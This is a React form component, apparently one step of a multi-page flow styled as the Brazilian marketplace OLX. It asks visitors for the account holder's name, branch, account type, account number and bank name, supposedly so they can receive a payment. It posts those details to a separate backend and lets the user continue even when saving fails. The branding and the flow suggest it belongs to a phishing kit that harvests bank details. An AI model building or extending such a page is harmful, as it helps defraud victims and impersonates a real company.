import React, { useState } from 'react';
import './Steps.css';
import OLXLogo from './OLXLogo';
import PhoneMockups from './PhoneMockups';
import DownloadButtons from './DownloadButtons';
import Footer from './Footer';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const Step6BankData = ({ onNext, formData, updateFormData }) => {
  const [bankData, setBankData] = useState({
    accountHolder: formData.bankData?.accountHolder || '',
    agency: formData.bankData?.agency || '',
    accountType: formData.bankData?.accountType || '',
    accountNumber: formData.bankData?.accountNumber || '',
    bank: formData.bankData?.bank || ''
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    try {
      // Salvar dados bancários no banco de dados
      if (formData.userId) {
        const response = await axios.post(`${API}/update-bank-data`, {
          user_id: formData.userId,
          account_holder: bankData.accountHolder,
          agency: bankData.agency,
          account_type: bankData.accountType,
          account_number: bankData.accountNumber,
          bank: bankData.bank
        });
        
        console.log('✅ Dados bancários salvos:', response.data);
      }
      
      updateFormData({ bankData });
      onNext();
    } catch (error) {
      console.error('Erro ao salvar dados bancários:', error);
      // Mesmo com erro, permite continuar
      updateFormData({ bankData });
      onNext();
    }
  };

  const handleChange = (field, value) => {
    setBankData(prev => ({ ...prev, [field]: value }));
  };

  return (
    <div className="step-container">
      <OLXLogo />
      
      <div className="step-content">
        <h1 className="step-title purple-title">Dados Bancários</h1>
        <p className="step-description">Informe seus dados para o recebimento:</p>
        
        <form className="step-form" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Nome completo do titular"
            className="form-input"
            value={bankData.accountHolder}
            onChange={(e) => handleChange('accountHolder', e.target.value)}
            required
          />
          <input
            type="text"
            placeholder="Agência"
            className="form-input"
            value={bankData.agency}
            onChange={(e) => handleChange('agency', e.target.value)}
            required
          />
          <input
            type="text"
            placeholder="Tipo de conta"
            className="form-input"
            value={bankData.accountType}
            onChange={(e) => handleChange('accountType', e.target.value)}
            required
          />
          <input
            type="text"
            placeholder="Número da conta"
            className="form-input"
            value={bankData.accountNumber}
            onChange={(e) => handleChange('accountNumber', e.target.value)}
            required
          />
          <input
            type="text"
            placeholder="Nome do banco"
            className="form-input"
            value={bankData.bank}
            onChange={(e) => handleChange('bank', e.target.value)}
            required
          />
          <button type="submit" className="btn-primary">
            Prosseguir
          </button>
        </form>
      </div>

      <div className="app-download-section">
        <h2 className="app-download-title">
          <span className="purple-bold">baixe o OLX app</span> e comece a vender com desconto
        </h2>
        <PhoneMockups />
        <DownloadButtons />
      </div>

      <Footer />
    </div>
  );
};

export default Step6BankData;